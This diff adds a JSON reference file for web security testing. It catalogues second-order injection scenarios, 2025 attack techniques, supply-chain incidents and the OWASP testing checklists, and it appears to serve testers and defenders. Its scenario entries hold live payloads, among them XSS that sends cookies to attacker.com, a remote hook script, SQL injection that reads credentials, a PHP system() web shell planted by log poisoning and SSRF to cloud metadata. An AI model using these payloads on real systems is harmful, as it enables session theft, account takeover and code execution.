@@ -1,0 +1,558 @@
+{
+  "metadata": {
+    "title": "Second-Order Injection Scenarios & Cutting-Edge Techniques",
+    "version": "1.0.0",
+    "last_updated": "2026-01-31"
+  },
+  "second_order_injection_scenarios": [
+    {
+      "id": "SO-001",
+      "name": "Database Stored then Rendered Unsafely",
+      "description": "Attacker stores payload in database via one input (e.g., registration form), which is later rendered without sanitization in a different context (e.g., admin panel, user profile page, or reporting dashboard).",
+      "attack_flow": [
+        "1. Attacker submits malicious input via registration, comment, profile update, etc.",
+        "2. Application stores input in database without modification (or with inadequate sanitization)",
+        "3. Different application feature retrieves stored data and renders it in HTML/JS/SQL context",
+        "4. Payload executes in the context of the user viewing the data"
+      ],
+      "examples": [
+        {
+          "scenario": "Stored XSS via Username",
+          "entry_point": "User registration form (username field)",
+          "storage": "Users table in database",
+          "trigger_point": "Admin user management page, comment display, @mention rendering",
+          "payload": "<script>fetch('https://attacker.com/'+document.cookie)</script>"
+        },
+        {
+          "scenario": "Second-Order SQL Injection",
+          "entry_point": "User registration (username field)",
+          "storage": "Users table in database",
+          "trigger_point": "Password change feature that queries by stored username",
+          "payload": "admin'--",
+          "explanation": "Username 'admin'--' is stored literally. When password change runs: UPDATE users SET password='X' WHERE username='admin'--' it modifies admin's password."
+        },
+        {
+          "scenario": "Stored XSS via Help Desk Ticket",
+          "entry_point": "Customer support form",
+          "storage": "Tickets table in database",
+          "trigger_point": "Internal support dashboard viewed by agents",
+          "payload": "<img src=x onerror='new Image().src=\"https://attacker.com/?c=\"+document.cookie'>"
+        },
+        {
+          "scenario": "Stored SSTI via Email Template",
+          "entry_point": "User profile 'display name' field",
+          "storage": "Users table",
+          "trigger_point": "Email notification template that interpolates display name",
+          "payload": "{{7*7}} or ${Runtime.getRuntime().exec('id')}"
+        }
+      ],
+      "affected_vulns": ["stored_xss", "second_order_sqli", "blind_xss", "stored_ssti"]
+    },
+    {
+      "id": "SO-002",
+      "name": "Cookies/Sessions Stored then Reflected",
+      "description": "Data stored in cookies or session variables is later reflected in responses without proper encoding, or used in server-side operations unsafely.",
+      "attack_flow": [
+        "1. Application sets cookie or session value based on user input",
+        "2. Cookie/session value is stored (client-side cookie or server-side session store)",
+        "3. On subsequent request, application reads cookie/session value and renders or processes it",
+        "4. If rendering: XSS. If processing in query: SQLi. If deserializing: RCE."
+      ],
+      "examples": [
+        {
+          "scenario": "XSS via Cookie Reflection",
+          "entry_point": "Language preference selector setting a cookie",
+          "storage": "Cookie: lang=<script>alert(1)</script>",
+          "trigger_point": "Page renders 'Your language: [cookie value]' without encoding",
+          "payload": "<script>alert(document.domain)</script>"
+        },
+        {
+          "scenario": "SQLi via Session Data",
+          "entry_point": "User profile that stores preferences in session",
+          "storage": "Server-side session (e.g., Redis, file, database)",
+          "trigger_point": "Report generation feature that uses session-stored filter in SQL query",
+          "payload": "' UNION SELECT username,password FROM users--"
+        },
+        {
+          "scenario": "Deserialization via Session Cookie",
+          "entry_point": "Any request that causes session data to be stored",
+          "storage": "Serialized session cookie (PHP, Java, .NET)",
+          "trigger_point": "Session deserialization on subsequent requests",
+          "payload": "Modified serialized object with gadget chain"
+        },
+        {
+          "scenario": "JWT Claim Injection",
+          "entry_point": "User registration/profile setting a JWT claim value",
+          "storage": "JWT cookie stored client-side",
+          "trigger_point": "Application reads JWT claim and uses in database query or renders in page",
+          "payload": "Set 'name' claim to SQL injection or XSS payload"
+        }
+      ],
+      "affected_vulns": ["xss", "sqli", "deserialization", "jwt_attacks"]
+    },
+    {
+      "id": "SO-003",
+      "name": "localStorage/sessionStorage to DOM Operations",
+      "description": "Data stored in browser storage by one page/feature is later read and used in unsafe DOM operations by another page/feature within the same origin.",
+      "attack_flow": [
+        "1. Application stores user-controlled data in localStorage/sessionStorage",
+        "2. Different page or component reads stored data",
+        "3. Data is used in a DOM sink (innerHTML, document.write, eval, src attribute, etc.)",
+        "4. XSS payload executes in victim's browser"
+      ],
+      "examples": [
+        {
+          "scenario": "DOM XSS via localStorage Username",
+          "entry_point": "Login page stores username in localStorage for 'Welcome back' feature",
+          "storage": "localStorage.setItem('username', userInput)",
+          "trigger_point": "Dashboard page: document.getElementById('welcome').innerHTML = 'Hello ' + localStorage.getItem('username')",
+          "payload": "<img src=x onerror=alert(1)>"
+        },
+        {
+          "scenario": "DOM XSS via Stored Search History",
+          "entry_point": "Search feature stores recent searches in localStorage",
+          "storage": "localStorage.setItem('recentSearches', JSON.stringify(searches))",
+          "trigger_point": "Search page renders recent searches using innerHTML",
+          "payload": "<svg onload=alert(document.cookie)>"
+        },
+        {
+          "scenario": "Prototype Pollution via Stored Config",
+          "entry_point": "Settings page stores user preferences as JSON in localStorage",
+          "storage": "localStorage.setItem('config', JSON.stringify(config))",
+          "trigger_point": "Application deep-merges stored config with defaults on load",
+          "payload": "{\"__proto__\": {\"innerHTML\": \"<img src=x onerror=alert(1)>\"}}"
+        },
+        {
+          "scenario": "DOM XSS via IndexedDB",
+          "entry_point": "Application caches API responses in IndexedDB",
+          "storage": "IndexedDB object store",
+          "trigger_point": "Offline mode reads cached data and renders without sanitization",
+          "payload": "API response containing XSS payload in a field"
+        }
+      ],
+      "affected_vulns": ["dom_xss", "prototype_pollution"],
+      "dom_sources": [
+        "localStorage.getItem()",
+        "sessionStorage.getItem()",
+        "IndexedDB transaction.objectStore().get()",
+        "window.name",
+        "document.cookie",
+        "document.referrer",
+        "window.postMessage data"
+      ],
+      "dom_sinks": [
+        "element.innerHTML",
+        "element.outerHTML",
+        "document.write()",
+        "document.writeln()",
+        "eval()",
+        "setTimeout(string)",
+        "setInterval(string)",
+        "Function(string)",
+        "element.src",
+        "element.href",
+        "element.action",
+        "jQuery.html()",
+        "jQuery.append()",
+        "jQuery.after()",
+        "jQuery.prepend()",
+        "React dangerouslySetInnerHTML",
+        "Angular bypassSecurityTrustHtml",
+        "Vue v-html directive"
+      ]
+    },
+    {
+      "id": "SO-004",
+      "name": "Log Files Rendered in Admin Panels",
+      "description": "User input logged by the application (User-Agent, username, IP, form values) is later displayed in a log viewing interface without proper encoding.",
+      "attack_flow": [
+        "1. Attacker sends requests with XSS payloads in logged fields (User-Agent, username, etc.)",
+        "2. Application logs these values to files or database",
+        "3. Administrator accesses log viewer (web-based dashboard, admin panel)",
+        "4. Log viewer renders stored payloads without encoding, executing in admin's browser"
+      ],
+      "examples": [
+        {
+          "scenario": "Blind XSS via User-Agent in Access Logs",
+          "entry_point": "HTTP User-Agent header",
+          "storage": "Web server access log or application log database",
+          "trigger_point": "Admin log viewer dashboard renders User-Agent column",
+          "payload": "<script src=https://attacker.com/hook.js></script>"
+        },
+        {
+          "scenario": "Blind XSS via Failed Login Username",
+          "entry_point": "Login form username field",
+          "storage": "Security audit log in database",
+          "trigger_point": "Security dashboard shows 'Failed login attempts' with username",
+          "payload": "\"><img src=x onerror='fetch(\"https://attacker.com/\"+document.cookie)'>"
+        },
+        {
+          "scenario": "Log Injection for Log Forging",
+          "entry_point": "Any logged input (username, search query, API parameter)",
+          "storage": "Application log file",
+          "trigger_point": "Log analysis or SIEM processing",
+          "payload": "admin\\n[2026-01-31 SUCCESS] User admin password changed"
+        },
+        {
+          "scenario": "LFI-to-RCE via Log Poisoning",
+          "entry_point": "HTTP User-Agent header",
+          "storage": "/var/log/apache2/access.log",
+          "trigger_point": "LFI vulnerability includes the log file, executing injected PHP code",
+          "payload": "<?php system($_GET['cmd']); ?> in User-Agent, then include via LFI"
+        }
+      ],
+      "affected_vulns": ["blind_xss", "log_injection", "log_forging", "lfi_to_rce"]
+    },
+    {
+      "id": "SO-005",
+      "name": "File Metadata (EXIF / Document Properties)",
+      "description": "Malicious payloads embedded in file metadata are extracted and displayed by the application without sanitization when the file is processed or its metadata is rendered.",
+      "attack_flow": [
+        "1. Attacker crafts a file (image, PDF, Office doc) with XSS/SQLi payload in metadata fields",
+        "2. File is uploaded to the application",
+        "3. Application extracts metadata (EXIF data, PDF properties, DOCX properties) and stores or displays it",
+        "4. When metadata is rendered in a web page, the payload executes"
+      ],
+      "examples": [
+        {
+          "scenario": "XSS via EXIF Comment in Image Gallery",
+          "entry_point": "Image upload (JPEG with modified EXIF Comment/ImageDescription)",
+          "storage": "Uploaded image file stored on server; metadata extracted to database",
+          "trigger_point": "Gallery page shows image details including EXIF data",
+          "payload": "exiftool -Comment='<script>alert(1)</script>' image.jpg",
+          "metadata_fields": ["Comment", "ImageDescription", "Artist", "Copyright", "UserComment"]
+        },
+        {
+          "scenario": "XSS via PDF Author Property",
+          "entry_point": "PDF file upload with malicious Author metadata",
+          "storage": "PDF stored on server; metadata extracted for indexing",
+          "trigger_point": "Document management system displays PDF properties",
+          "payload": "PDF Author field set to <img src=x onerror=alert(1)>"
+        },
+        {
+          "scenario": "SQLi via DOCX Properties",
+          "entry_point": "DOCX file upload with malicious Title/Subject property",
+          "storage": "DOCX stored; properties extracted and stored in database",
+          "trigger_point": "Document search feature queries by stored metadata",
+          "payload": "Title set to: ' OR 1=1--"
+        },
+        {
+          "scenario": "SSRF via SVG Processing",
+          "entry_point": "SVG file upload",
+          "storage": "SVG file stored on server",
+          "trigger_point": "Server-side image processing (thumbnail generation, PDF rendering)",
+          "payload": "<svg><image href='http://169.254.169.254/latest/meta-data/'/></svg>"
+        }
+      ],
+      "affected_vulns": ["stored_xss", "sqli", "ssrf", "blind_xss"],
+      "vulnerable_metadata_fields": {
+        "jpeg_exif": ["Comment", "ImageDescription", "Artist", "Copyright", "UserComment", "Make", "Model"],
+        "pdf": ["Title", "Author", "Subject", "Keywords", "Creator", "Producer"],
+        "docx": ["Title", "Subject", "Creator", "Keywords", "Description", "Last Modified By"],
+        "mp3_id3": ["Title", "Artist", "Album", "Comment", "Genre"],
+        "mp4": ["Title", "Artist", "Album", "Comment"]
+      }
+    }
+  ],
+  "cutting_edge_techniques_2025": {
+    "mutation_xss": {
+      "description": "Mutation XSS (mXSS) exploits differences between how HTML sanitizers parse content and how browsers render it. The sanitizer sees benign HTML, but the browser's DOM mutations transform it into executable JavaScript.",
+      "key_concepts": [
+        "Parser differentials between sanitizer and browser",
+        "Namespace confusion (HTML vs SVG vs MathML parsing rules)",
+        "noscript element parsing differs based on JavaScript enabled state",
+        "Comment boundary confusion",
+        "Template element processing differences"
+      ],
+      "notable_2025_cves": [
+        {
+          "cve": "CVE-2025-26791",
+          "affected": "DOMPurify < 3.2.4",
+          "description": "Incorrect regular expression in template literal handling allows mXSS bypass"
+        }
+      ],
+      "detection_approach": "Test sanitized HTML output by comparing sanitizer parse tree vs browser parse tree. Inject payloads using math/svg namespace switches and parser-confusing constructs."
+    },
+    "dom_clobbering_2025": {
+      "description": "DOM clobbering exploits how browsers resolve named HTML elements as global JavaScript variables. 2025 USENIX Security research ('The DOMino Effect') used the Hulk tool to find 497 exploitable gadgets across Tranco Top 5000 sites, resulting in 19 CVEs.",
+      "key_findings": [
+        "Three new clobbering techniques beyond prior work (form parent-child, nested window proxy, HTMLCollection)",
+        "16 out of 29 popular HTML sanitizers are vulnerable to DOM Clobbering markups",
+        "Completely disabling DOM Clobbering features would break ~12.16% of web pages",
+        "Zero-day gadgets found in Google Client API, Google Closure, MathJax, and Webpack"
+      ],
+      "advanced_techniques": [
+        "HTMLCollection clobbering via duplicate IDs",
+        "Form + input combinations for nested property access",
+        "Anchor tag toString() override via href attribute",
+        "Under the Beamer: Chromium HTMLCollection DOM clobbering chained with library node-removal gadgets to bypass DOMPurify (2025 PortSwigger nomination)"
+      ]
+    },
+    "prototype_pollution_chains": {
+      "description": "Prototype pollution has evolved from a theoretical concern to a practical attack vector, especially when chained with DOM XSS gadgets or server-side RCE vectors.",
+      "client_side_chains": [
+        "Prototype pollution -> innerHTML gadget -> XSS",
+        "Prototype pollution -> script src gadget -> RCE",
+        "Prototype pollution -> template literal gadget -> XSS",
+        "Prototype pollution -> disable sanitizer function -> XSS"
+      ],
+      "server_side_chains": [
+        "Prototype pollution -> child_process.spawn options -> RCE",
+        "Prototype pollution -> EJS/Pug template options -> RCE",
+        "Prototype pollution -> NODE_OPTIONS environment -> RCE",
+        "Prototype pollution -> module resolution -> arbitrary module loading"
+      ],
+      "detection_tools": [
+        "DOM Invader (Burp Suite built-in)",
+        "PPScan",
+        "PPMap"
+      ]
+    },
+    "http_request_smuggling_2025": {
+      "description": "James Kettle's 2025 Black Hat/DEFCON research 'HTTP/1.1 Must Die: The Desync Endgame' revealed new smuggling variants and detection techniques, compromising tens of millions of sites.",
+      "new_variants": [
+        {
+          "name": "Double-Desync Request Smuggling",
+          "description": "Leverages Expect handling quirks and early-response gadgets to turn 0.CL deadlocks into reliable smuggling for response queue poisoning and cross-tenant hijacking"
+        },
+        {
+          "name": "Funky Chunks",
+          "description": "New primitives exploiting two-byte chunk-body terminator overreads and ambiguous trailer-section newline handling"
+        },
+        {
+          "name": "CDN Cache Poisoning at Scale",
+          "description": "Single protocol-level flaw enabling control over 24 million websites via CDN cache poisoning"
+        }
+      ],
+      "key_insight": "Detection should focus on desync primitives (parser discrepancies) rather than full exploit payloads. WAF regex-based defenses are easily bypassed by minor payload tweaks."
+    },
+    "next_js_cache_poisoning": {
+      "description": "2025 technique chaining a spoofable framework-internal header with Next.js data-request mechanisms to force-cache SSR JSON as HTML, enabling cache-poisoning DoS and stored XSS via stale-while-revalidate.",
+      "impact": "Stored XSS and DoS through framework-level cache poisoning"
+    },
+    "browser_powered_desync": {
+      "description": "Attacks that use a victim's web browser as a desync delivery platform, enabling exploitation of single-server websites and internal networks by combining cross-domain requests with server flaws to poison browser connection pools.",
+      "targets": ["Apache", "Akamai", "Varnish", "Amazon ALB"]
+    },
+    "supply_chain_attacks_2025": {
+      "notable_incidents": [
+        {
+          "name": "npm Supply Chain Meltdown (September 2025)",
+          "description": "Attacker compromised prominent npm maintainer account via phishing, injected crypto wallet stealer into popular packages"
+        },
+        {
+          "name": "Shai-Hulud Worm",
+          "description": "Self-replicating worm spreading through npm ecosystem autonomously, harvesting maintainer credentials and auto-publishing compromised packages"
+        },
+        {
+          "name": "GitHub Actions Compromise (March 2025)",
+          "description": "CVE-2025-30066: tj-actions/changed-files compromised, CI/CD secrets leaked in public build logs"
+        },
+        {
+          "name": "GhostAction",
+          "description": "Massive attack affecting 327 GitHub users across 817 repositories, exfiltrating 3,325 secrets including PyPI, npm, and DockerHub tokens"
+        }
+      ]
+    },
+    "web_cache_deception_2025": {
+      "description": "Evolved technique exploiting path normalization differences between CDN/cache layers and origin servers to trick caches into storing sensitive authenticated responses.",
+      "techniques": [
+        "Path confusion: /account/settings/nonexistent.css",
+        "Delimiter confusion: /account%2fsettings",
+        "Dot segment abuse: /static/../account/settings",
+        "Encoded path traversal: /account/..%2fstatic/cached.js"
+      ]
+    }
+  },
+  "owasp_wstg_complete_checklist": {
+    "INFO": {
+      "name": "Information Gathering",
+      "tests": {
+        "WSTG-INFO-01": "Conduct Search Engine Discovery and Reconnaissance for Information Leakage",
+        "WSTG-INFO-02": "Fingerprint Web Server",
+        "WSTG-INFO-03": "Review Webserver Metafiles for Information Leakage",
+        "WSTG-INFO-04": "Enumerate Applications on Webserver",
+        "WSTG-INFO-05": "Review Webpage Content for Information Leakage",
+        "WSTG-INFO-06": "Identify Application Entry Points",
+        "WSTG-INFO-07": "Map Execution Paths Through Application",
+        "WSTG-INFO-08": "Fingerprint Web Application Framework",
+        "WSTG-INFO-09": "Fingerprint Web Application",
+        "WSTG-INFO-10": "Map Application Architecture"
+      }
+    },
+    "CONF": {
+      "name": "Configuration and Deployment Management Testing",
+      "tests": {
+        "WSTG-CONF-01": "Test Network Infrastructure Configuration",
+        "WSTG-CONF-02": "Test Application Platform Configuration",
+        "WSTG-CONF-03": "Test File Extensions Handling for Sensitive Information",
+        "WSTG-CONF-04": "Review Old Backup and Unreferenced Files for Sensitive Information",
+        "WSTG-CONF-05": "Enumerate Infrastructure and Application Admin Interfaces",
+        "WSTG-CONF-06": "Test HTTP Methods",
+        "WSTG-CONF-07": "Test HTTP Strict Transport Security",
+        "WSTG-CONF-08": "Test RIA Cross Domain Policy",
+        "WSTG-CONF-09": "Test File Permission",
+        "WSTG-CONF-10": "Test for Subdomain Takeover",
+        "WSTG-CONF-11": "Test Cloud Storage",
+        "WSTG-CONF-12": "Test for Content Security Policy"
+      }
+    },
+    "IDNT": {
+      "name": "Identity Management Testing",
+      "tests": {
+        "WSTG-IDNT-01": "Test Role Definitions",
+        "WSTG-IDNT-02": "Test User Registration Process",
+        "WSTG-IDNT-03": "Test Account Provisioning Process",
+        "WSTG-IDNT-04": "Testing for Account Enumeration and Guessable User Account",
+        "WSTG-IDNT-05": "Testing for Weak or Unenforced Username Policy"
+      }
+    },
+    "ATHN": {
+      "name": "Authentication Testing",
+      "tests": {
+        "WSTG-ATHN-01": "Testing for Credentials Transported over an Encrypted Channel",
+        "WSTG-ATHN-02": "Testing for Default Credentials",
+        "WSTG-ATHN-03": "Testing for Weak Lock Out Mechanism",
+        "WSTG-ATHN-04": "Testing for Bypassing Authentication Schema",
+        "WSTG-ATHN-05": "Testing for Vulnerable Remember Password",
+        "WSTG-ATHN-06": "Testing for Browser Cache Weaknesses",
+        "WSTG-ATHN-07": "Testing for Weak Password Policy",
+        "WSTG-ATHN-08": "Testing for Weak Security Question/Answer",
+        "WSTG-ATHN-09": "Testing for Weak Password Change or Reset Functionalities",
+        "WSTG-ATHN-10": "Testing for Weaker Authentication in Alternative Channel",
+        "WSTG-ATHN-11": "Testing Multi-Factor Authentication (MFA)"
+      }
+    },
+    "ATHZ": {
+      "name": "Authorization Testing",
+      "tests": {
+        "WSTG-ATHZ-01": "Testing Directory Traversal File Include",
+        "WSTG-ATHZ-02": "Testing for Bypassing Authorization Schema",
+        "WSTG-ATHZ-03": "Testing for Privilege Escalation",
+        "WSTG-ATHZ-04": "Testing for Insecure Direct Object References",
+        "WSTG-ATHZ-05": "Testing for OAuth Weaknesses"
+      }
+    },
+    "SESS": {
+      "name": "Session Management Testing",
+      "tests": {
+        "WSTG-SESS-01": "Testing for Session Management Schema",
+        "WSTG-SESS-02": "Testing for Cookies Attributes",
+        "WSTG-SESS-03": "Testing for Session Fixation",
+        "WSTG-SESS-04": "Testing for Exposed Session Variables",
+        "WSTG-SESS-05": "Testing for Cross Site Request Forgery",
+        "WSTG-SESS-06": "Testing for Logout Functionality",
+        "WSTG-SESS-07": "Testing Session Timeout",
+        "WSTG-SESS-08": "Testing for Session Puzzling",
+        "WSTG-SESS-09": "Testing for Session Hijacking",
+        "WSTG-SESS-10": "Testing JSON Web Tokens",
+        "WSTG-SESS-11": "Testing for Concurrent Sessions"
+      }
+    },
+    "INPV": {
+      "name": "Input Validation Testing",
+      "tests": {
+        "WSTG-INPV-01": "Testing for Reflected Cross Site Scripting",
+        "WSTG-INPV-02": "Testing for Stored Cross Site Scripting",
+        "WSTG-INPV-03": "Testing for HTTP Verb Tampering",
+        "WSTG-INPV-04": "Testing for HTTP Parameter Pollution",
+        "WSTG-INPV-05": "Testing for SQL Injection",
+        "WSTG-INPV-06": "Testing for LDAP Injection",
+        "WSTG-INPV-07": "Testing for XML Injection",
+        "WSTG-INPV-08": "Testing for SSI Injection",
+        "WSTG-INPV-09": "Testing for XPath Injection",
+        "WSTG-INPV-10": "Testing for IMAP/SMTP Injection",
+        "WSTG-INPV-11": "Testing for Code Injection / Local File Inclusion",
+        "WSTG-INPV-12": "Testing for Command Injection",
+        "WSTG-INPV-13": "Testing for Format String Injection",
+        "WSTG-INPV-14": "Testing for Incubated Vulnerability",
+        "WSTG-INPV-15": "Testing for HTTP Splitting/Smuggling",
+        "WSTG-INPV-16": "Testing for HTTP Incoming Requests",
+        "WSTG-INPV-17": "Testing for Host Header Injection",
+        "WSTG-INPV-18": "Testing for Server-Side Template Injection",
+        "WSTG-INPV-19": "Testing for Server-Side Request Forgery",
+        "WSTG-INPV-20": "Testing for Mass Assignment"
+      }
+    },
+    "ERRH": {
+      "name": "Error Handling",
+      "tests": {
+        "WSTG-ERRH-01": "Testing for Improper Error Handling",
+        "WSTG-ERRH-02": "Testing for Stack Traces"
+      }
+    },
+    "CRYP": {
+      "name": "Cryptography",
+      "tests": {
+        "WSTG-CRYP-01": "Testing for Weak Transport Layer Security",
+        "WSTG-CRYP-02": "Testing for Padding Oracle",
+        "WSTG-CRYP-03": "Testing for Sensitive Information Sent Via Unencrypted Channels",
+        "WSTG-CRYP-04": "Testing for Weak Encryption"
+      }
+    },
+    "BUSL": {
+      "name": "Business Logic Testing",
+      "tests": {
+        "WSTG-BUSL-01": "Test Business Logic Data Validation",
+        "WSTG-BUSL-02": "Test Ability to Forge Requests",
+        "WSTG-BUSL-03": "Test Integrity Checks",
+        "WSTG-BUSL-04": "Test for Process Timing",
+        "WSTG-BUSL-05": "Test Number of Times a Function Can Be Used Limits",
+        "WSTG-BUSL-06": "Testing for the Circumvention of Work Flows",
+        "WSTG-BUSL-07": "Test Defenses Against Application Misuse",
+        "WSTG-BUSL-08": "Test Upload of Unexpected File Types",
+        "WSTG-BUSL-09": "Test Upload of Malicious Files"
+      }
+    },
+    "CLNT": {
+      "name": "Client-Side Testing",
+      "tests": {
+        "WSTG-CLNT-01": "Testing for DOM-Based Cross Site Scripting",
+        "WSTG-CLNT-02": "Testing for JavaScript Execution",
+        "WSTG-CLNT-03": "Testing for HTML Injection",
+        "WSTG-CLNT-04": "Testing for Client-Side URL Redirect",
+        "WSTG-CLNT-05": "Testing for CSS Injection",
+        "WSTG-CLNT-06": "Testing for Client-Side Resource Manipulation",
+        "WSTG-CLNT-07": "Test Cross Origin Resource Sharing",
+        "WSTG-CLNT-08": "Testing for Cross Site Flashing",
+        "WSTG-CLNT-09": "Testing for Clickjacking",
+        "WSTG-CLNT-10": "Testing WebSockets",
+        "WSTG-CLNT-11": "Test Web Messaging",
+        "WSTG-CLNT-12": "Test Browser Storage",
+        "WSTG-CLNT-13": "Testing for Cross Site Script Inclusion",
+        "WSTG-CLNT-14": "Testing for Reverse Tabnabbing"
+      }
+    },
+    "APIT": {
+      "name": "API Testing",
+      "tests": {
+        "WSTG-APIT-01": "Testing GraphQL",
+        "WSTG-APIT-02": "Testing for Broken Object Level Authorization"
+      }
+    }
+  },
+  "owasp_top10_2025": {
+    "A01": {"name": "Broken Access Control", "includes": ["IDOR", "SSRF", "Path Traversal", "Privilege Escalation", "CORS Misconfiguration", "Open Redirect"]},
+    "A02": {"name": "Security Misconfiguration", "includes": ["Missing Security Headers", "Default Credentials", "Verbose Errors", "Unnecessary Features", "Cache Poisoning", "Request Smuggling"]},
+    "A03": {"name": "Software Supply Chain Failures", "includes": ["Dependency Confusion", "Typosquatting", "Compromised Dependencies", "CI/CD Compromise", "Container Image Poisoning"]},
+    "A04": {"name": "Cryptographic Failures", "includes": ["Weak TLS", "Weak Encryption", "Missing Encryption", "Key Management Failures"]},
+    "A05": {"name": "Injection", "includes": ["SQLi", "XSS", "Command Injection", "LDAP Injection", "NoSQL Injection", "SSTI", "XXE", "CRLF"]},
+    "A06": {"name": "Insecure Design", "includes": ["Missing Threat Modeling", "Insecure Architecture", "Missing Security Controls"]},
+    "A07": {"name": "Identification and Authentication Failures", "includes": ["Brute Force", "Weak Passwords", "Session Fixation", "JWT Attacks", "MFA Bypass"]},
+    "A08": {"name": "Software and Data Integrity Failures", "includes": ["Insecure Deserialization", "Code Integrity", "CI/CD Integrity"]},
+    "A09": {"name": "Security Logging and Alerting Failures", "includes": ["Missing Logging", "Log Injection", "Missing Alerting", "Insufficient Monitoring"]},
+    "A10": {"name": "Mishandling of Exceptional Conditions", "includes": ["Improper Error Handling", "Failing Open", "Logical Errors", "Resource Exhaustion"]}
+  },
+  "owasp_api_top10_2023": {
+    "API1": {"name": "Broken Object Level Authorization (BOLA)", "related_vulns": ["IDOR"]},
+    "API2": {"name": "Broken Authentication", "related_vulns": ["JWT Attacks", "Session Fixation"]},
+    "API3": {"name": "Broken Object Property Level Authorization", "related_vulns": ["Mass Assignment"]},
+    "API4": {"name": "Unrestricted Resource Consumption", "related_vulns": ["DoS", "Rate Limit Bypass"]},
+    "API5": {"name": "Broken Function Level Authorization", "related_vulns": ["Privilege Escalation"]},
+    "API6": {"name": "Unrestricted Access to Sensitive Business Flows", "related_vulns": ["Business Logic Abuse"]},
+    "API7": {"name": "Server-Side Request Forgery", "related_vulns": ["SSRF"]},
+    "API8": {"name": "Security Misconfiguration", "related_vulns": ["CORS", "Verbose Errors", "Default Settings"]},
+    "API9": {"name": "Improper Inventory Management", "related_vulns": ["Shadow APIs", "Deprecated Endpoints"]},
+    "API10": {"name": "Unsafe Consumption of APIs", "related_vulns": ["SSRF", "Injection via Downstream APIs"]}
+  }
+}
